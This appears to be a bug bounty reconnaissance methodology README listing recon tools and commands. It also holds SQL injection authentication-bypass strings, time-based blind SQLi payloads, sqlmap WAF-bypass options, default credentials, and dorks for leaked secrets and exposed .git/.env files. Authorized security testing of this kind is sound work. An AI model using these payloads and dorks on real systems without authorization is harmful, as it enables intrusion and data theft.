##################         My Current Bug Bounty Recon     ##################################
  
                        By wadgamaraldeen :- https://x.com/wadgamaraldeen
                        https://www.linkedin.com/in/wadgamaraldeen
                                

1- I made this simple bash script for Subdomain Enumeration Proces :-


Link :- https://github.com/wadgamaraldeen/My-Current-Recon/blob/main/subs.sh

## Environment Requirements

    Operating System: Linux or macOS (or WSL on Windows)

    Bash shell installed and properly configured

    Internet access (the tools rely on external queries)

    Your GitHub API Key for github-subdomains.py

## Install Reuired Tools :-

go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/owasp-amass/amass/v3/...@master
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/tomnomnom/anew@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
sudo apt install curl
pip install requests

## Usage :-

1- Put subs.sh script and domains.txt file in the same directory.
2- in terminal type :-  bash subs.sh 

## domains.txt file contains :-

target1.com
target2.com
target3.com
.
.
.
etc

## Output :-

all-subs.txt
live-subs.txt




2- I made this simple Bash Script for the live Urls, Parameters and Javascript Files Collecting from Specific domain or subdomain :-

Link :- https://github.com/wadgamaraldeen/My-Current-Recon/blob/main/recon.sh

## Environment Requirements

    Operating System: Linux or macOS (or WSL on Windows)

    Bash shell installed and properly configured

    Internet access (the tools rely on external queries)

    Your GitHub API Key for github-endpoints.py


## Install Reuired Tools :-

go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/lc/gau@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
pip install uro
pip install requests


## Usage :-

1- Put recon.sh script and target.txt file in the same directory.
2- in terminal type :-  bash recon.sh 

## target.txt file contains :-

target.com or sub.target.com


## Output :-

params.txt  (live parameters)          ------> Test for sqli, xss, ssti, ssrf ......etc
js-files.txt (live javascript files)   ------> Look for sensitive secrets and directories
turls.txt    (live urls)
github-urls.txt



* Looking for possible sensitive keys, tokens, passwords or secretes ...etc inside js files found on turls.txt file :-

cat turls.txt | grep -E "\.js$" | httpx -mc 200 -content-type | grep -E "application/javascript | text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY | api_key | apikey | secret | token | auth | password)"



* Looking for possible Sensitive Files found on turls.txt file :- :-

cat turls.txt | grep -E "\.xls | \.xml | \.xlsx | \.json | \.pdf | \.sql | \.doc | \.docx | \.pptx | \.txt | \.zip | \.tar\.gz | \.tgz | \.bak | \.7z | \.rar | \.log | \.cache | \.secret | \.db | \.backup | \.yml | \.gz | \.config | \.csv | \.yaml | \.md | \.md5"


* Looking for possible Sensitive Files found on specific domain :-


site:*.target.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)






### Analyzing Javascript files :- ( Also check my Writeup :- https://medium.com/@wadgamaraldeen/how-i-got-access-to-20-000-users-piis-via-a-javascript-file-analysis-critical-e0ac967e70e0)

* For example if you have this js file :-   https://blabla.blabla.example.com/js/tabs/admin.js


- Try To look for possible php files i used :- CTRL + F and typed :- php? and i found this endpoint :- /blabla.php?search_type=eight_export&tab=admin&eight_export_start=


- Try To look for possible php, asp, aspx, jsp files :-


Press CTRL + F and type :- .php, .asp, .aspx, .jsp, https://, .js, . . . . . etc







## Collecting URls from many Resource using the cool tool :- waymore  :-


Link :- https://github.com/xnl-h4ck3r/waymore
 

## Installation :-

pip install waymore


## Basic Usage
 Command Syntax:

waymore -i <target> -mode <mode> -oU <output_file>

 Example:

waymore -i example.com -mode U -oU urls.txt

    -i example.com → Target domain

    -mode U → URL collection mode (U = URLs only)

    -oU urls.txt → Save output to urls.txt

##  Modes Explanation


Mode	Description
U	Collect URLs
F	Collect files (.js, .php..)
E	Find endpoints (parameters)
B	Run all modes (comprehensive)


## Useful Options

    -i → Input target (domain or list)

    -l → Load targets from a file

    -oU → Save URLs to a file

    -oF → Save files to a file

    -oE → Save endpoints to a file

    -oB → Save all results to a file









3- Testing for Subdomain Takeover :-

A- 

nuclei -l live-subs.txt -t /root/nuclei-templates/http/takeovers

B-

subzy run --targets live-subs.txt --concurrency 100 --hide_fails --verify_ssl


C-

subjack -w live-subs.txt -t 100 -ssl -c fingerprints.json -o results.txt


* Then check manually using :-

dig sub.target.com CNAME

nslookup sub.tagter.com


* Then check of service is vulnerable via :- https://github.com/EdOverflow/can-i-take-over-xyz




4- Fuzzing all live subs using my short custom fuzzing wordlist :-

In direarch folder replcae the default wordlist :-

cd dirsearch/db
mv dicc.txt default.txt
mv new.txt dicc.txt

cat live-subs.txt | python3 dirsearch.py -i 200 -e php,bak,old,zip,tar.gz,txt,log,conf,json,asp,jsp,aspx,yml,yaml,rar --stdin


* My short custom fuzzing wordlist link :- https://github.com/wadgamaraldeen/poc/blob/main/new.txt


* If i found interesting dirs/files in a subdomain i complete the fuzzing process using my primary full fuzzing wordlist :- https://github.com/wadgamaraldeen/Fuzzing-wordlists/blob/main/w.txt




5- Port Scanning using naabu :-


A- Remove http:// and https:// from the live-subs.txt file using any text editor and save the new result in :- live-hosts.txt file


B- 

naabu -list live-hosts.txt -c 50 -o naabu-full.txt
naabu -rate 10000 -l live-hosts.txt -silent -o ports.txt
naabu -rate 10000 -host sub.target.com -silent

## Then:-

- See open ports and check if the services are vulnerable :-

nmap -p 8443 -Pn -sV sub.target.com -oN scaned-port.txt --script=vuln


- If you found https://sub.target.com:8443 fuzz it :-

 ffuf -u https://sub.target.com:8443/FUZZ -w w.txt -mc 200 -c true -v





6- Check all live subs for specific services and ports :-


httpx -l live-subs.txt -p 8080,8443,8000,8888,8081,8181,3306,5432,6379,27017,15672,10000,9090,5900 -threads 80 -title -sc -cl -server -ip -o services-ports.txt






7- Then do Deep and Smart Fuzzing :-

For example if you have :-

A- https://sub.target.com:8443/phpmyadmin/login.php  :-

Fuzz like this :-

 ffuf -u https://sub.target.com/FUZZ -w w.txt -mc 200 -c true -v
 ffuf -u https://sub.target.com:8443/FUZZ -w w.txt -mc 200 -c true -v
 ffuf -u https://sub.target.com:8443/phpmyadmin/FUZZ -w w.txt -mc 200 -c true -v


B- https://sub.target.com:/portal/login.aspx   :-

  ffuf -u https://sub.target.com/FUZZ -w aspx.txt -mc 200 -c true -v
  ffuf -u https://sub.target.com/portal/FUZZ -w aspx.txt -mc 200 -c true -v



* Try to fucos on interesting subs :-

cat live-subs.txt | grep -E "portal|login|admin|signin|dashboard|test|internal|dev|developer|signup|register|panel"



* Recon on interesting subs :- https://freelancermijan.github.io/reconengine/





8- Shodan Dorking :-



- http.title:"WoodWing Studio Server"  woodwing : ww

- http.favicon.hash:434501501

- ssl:"Facebook"

- ssl.cert.subject.CN:"target.com*" 200

- http.title:"Grafana" 200

- http.title:"Citrix Gateway" 200

- net:192.168.20/24,192.168.44/24

- ssl.cert.subject.CN:"*.target.com" "230 login successful" port:"21"

- ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"

- Set-Cookie:"mongo-express=" "200 OK"

- ssl:"target.com" http.title:"index of / "

- ssl:"target.com" 200 http.title:"dashboard"

- AEM Login panel :-  git clone https://github.com/0ang3el/aem-hacker.git

User:anonymous
Pass:anonymous





9- Google Dorking :-

site:*.target.com inurl:"*admin | login" | inurl:.php | .asp inurl:.jsp | .aspx

site:*.target.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)

- intitle:"WoodWing Studio Server"        woodwing : ww

- intext:"Unibox Administration 3.1   CVE-2023-34635

- intext:"Unibox 3.0"  CVE-2023-34635

- site:*.target.com inurl:”*admin | login” | inurl:.php | .asp

- intext:"index of /.git"

- site:*.target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"


- site:*.target.com link:www.facebook.com | link:www.instagram.com | link:www.twitter.com | link:www.youtube.com | link:www.telegram.com |
link:www.hackerone.com | link:www.slack.com | link:www.github.com

- inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)

- inurl:/geoserver/ows?service=wf



10 - Github Dorking :-  Also use this cool website :- https://freelancermijan.github.io/reconengine/

"target.com" secret
"target.com" token
"target.com" password
"target.com" authorization_bearer:
"target.com" client_secret
"target.com" aws_secret_key

org:target secret
org:target token
org:target password
org:target authorization_bearer:
.
.
.
etc



11- ZoomEye Dorks for Famous CVEs and Vulnerabilities Exposure & Misconfiguration  :-

domain="target.com" && app="Langflow"

organization="Cloudflare, Inc."


app="phpmyadmin" && country="US" && port=80 && organization="Facebook Inc"


PhpMyAdmin Exposure

app="phpmyadmin"

Git Exposure

app="Git repository"

.env File Exposure

file=.env

.git Folder Exposure

app="nginx" && path=/.git

 Remote Code Execution (RCE)
CVE-2021-44228 (Log4j - Log4Shell)

app="Apache" && port=443

(Then test for Log4Shell manually.)

CVE-2022-22965 (Spring4Shell)

app="Spring Boot"

CVE-2017-5638 (Apache Struts 2 RCE)

app="Apache Struts"

 File Upload Services
Exposed File Uploaders

title="file upload" || body="file upload"

 Admin Panels
Exposed Admin Portals

title="admin" && port=80

Exposed Jenkins Dashboard

app="Jenkins"

Exposed Kibana Dashboard

app="kibana"

Exposed Grafana Dashboard

app="grafana"

 Known Software with Historical CVEs
Apache Solr (Multiple CVEs)

app="solr"

F5 Big-IP (Multiple CVEs)

app="F5 BIG-IP"

Elasticsearch (Multiple CVEs)

app="Elasticsearch"

 Search Tips

    Combine country=, port=, and os= to narrow results.

    Example=

app="phpmyadmin" && country="US" && port=80



12-  Scanning all live subs using custom nuclei templates :-


A :-

nuclei -l live-subs.txt -t nuclei-templates/http/cves/2017/CVE-2017-12149.yaml -t nuclei-templates/http/cves/2019/CVE-2019-15043.yaml -t nuclei-templates/http/cves/2023/CVE-2023-24488.yaml -t nuclei-templates/http/cves/2017/CVE-2017-9140.yaml -t nuclei-templates/http/cves/2023/CVE-2023-38035.yaml -t nuclei-templates/http/cves/2021/CVE-2021-38314.yaml -t nuclei-templates/http/misconfiguration/phpmyadmin/phpmyadmin-setup.yaml -t nuclei-templates/http/vulnerabilities/jenkins/unauthenticated-jenkins.yaml -t nuclei-templates/http/vulnerabilities/jenkins/jenkins-script.yaml -t nuclei-templates/http/misconfiguration/jenkins/jenkins-openuser-register.yaml -t nuclei-templates/http/vulnerabilities/citrix/citrix-oob-memory-read.yaml -t nuclei-templates/http/exposed-panels/phpmyadmin-panel.yaml


B :-

nuclei -l live-subs.txt -t nuclei-templates (Using Cool custom nuclei templates from Coffin repo ):-
https://github.com/coffinxp/nuclei-templates,  https://x.com/coffinxp7


C :-

nuclei -l live-subs.txt -t swagger\Swagger.yaml ( Using the graet custom Swagger UI Vulns tenplate by :- 
coffin :- https://github.com/coffinxp/swagger,  https://x.com/coffinxp7

and if you found swagger ui endpoint chech this cool writeup :- https://medium.com/@adhaamsayed3/found-6-domxss-at-different-programs-hacking-swagger-ui-5767c9d6d024





13 - How i Hunt On Login Pages :-

 

* Try deafault credentials and Authentication Bypass :-

admin admin
demo  demo
test  test


    Authentication Bypass :-


admin' or 1=1 #
' or 1=1 --
' or 1=1 ; #
' or 1=1 ; --



    Response Manipulation.





* Identify login page Technologies for posibble CVEs.


* look for SQli bugs at username/password parameters :-


    sqlmap -u https://testestestest.com/login.php --dbs --forms --crawl=2


    sqlmap -r request.txt -p login --level 5 --risk 3 --dbs --batch


    sqlmap -u "https://testestestest.com/submit.php" --data="search=hello&value=submit" --batch




admin'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--
admin%20waitfor%20delay%20'0:0:15'%20--%20
-6513%27%20OR%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL--%20SpSw


WAF Bypass :-


--batch --random-agent --level=5 --risk=3 --threads=10 --dbs


--batch --random-agent --tamper="space2comment" --level=5 --risk=3 --threads=10 --dbs


--level=5 --risk=3 --random-agent -v3 --tamper="between,randomcase,space2comment" --dbs



* look for XSS bugs at username/password parameters.




* Use Arjun for getting possible hidden parameters :-

arjun -u "https://www.testtttt.com/si/gfgfgfgfg..." -w w/burp-parameter-names.txt -m GET,POST



* See Waybackmachine for links and parameters


* See page source :- Look for intersting links, js files, parameters, possible secrets


* Fuzzing Username and Password using Intruder.




14- Testing For SQli :-



ghauri -r r.txt -p Username --batch --level 3 --dbs

sqlmap -r r.txt -p Username --batch --level 3 --risk 3

sqlmap -u "https://sub.target.com/ddfdff/file.php?id=333&url=fgf  --batch --level 3 --risk 3


ghauri -u "https://sub.target.com/ddfdff/file.php?id=333&url=fgf  --batch --level 3

sqlmap -r r.txt --dbms="MySQL" --level 5 --risk 3 --dbs --hostname


Blind SQL Injection POST Test :-

'
'--
\
#

ghauri -u 'https://target.net/login/login' --data "login=*&password=admin&remember=1" --batch --level 3 --flush-session

ghauri -r r.txt -p user_session[login] --batch --level 3

time curl -X POST -d "user='XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pass=test" https://test/ff/login.php




15- JS Hunting :-

--- Collecting :-

1- katana -u comcast.net -d 5 -jc | grep "\.js$" | httpx -mc 200 | sort -u | tee js-files.txt

2- echo example.com | gau | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt -a

3- cat waymore.txt | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt -a


--- Scanning :-

1- cat js-files.txt | jscracker | tee jscracker-result.txt

2- nuclei -l js-files.txt -t /root/nuclei-templates/http/exposures/ | tee nuclei-result.txt

3- JSS-Scanner :-  python3 JSScanner.py 

4- Pinkerton :- python3 main.py -u https://example.com | tee pinkerton-result.txt



go install github.com/Ractiurd/jscracker@latest

go install github.com/projectdiscovery/katana/cmd/katana@latest



## Soon Inshaa Allah i will make A Broken Access Controls and IDORS and APIs Hunting Methodology, Stay close : )



## If you wanner following me on Social Media :-

https://t.me/wadgamaraldeen  (My Telegram Channel For Bug Bounty Tips And Writeups)
https://twitter.com/wadgamaraldeen
https://www.linkedin.com/in/wadgamaraldeen
https://www.facebook.com/wadgamaraldeen
https://medium.com/@wadgamaraldeen
https://github.com/wadgamaraldeen









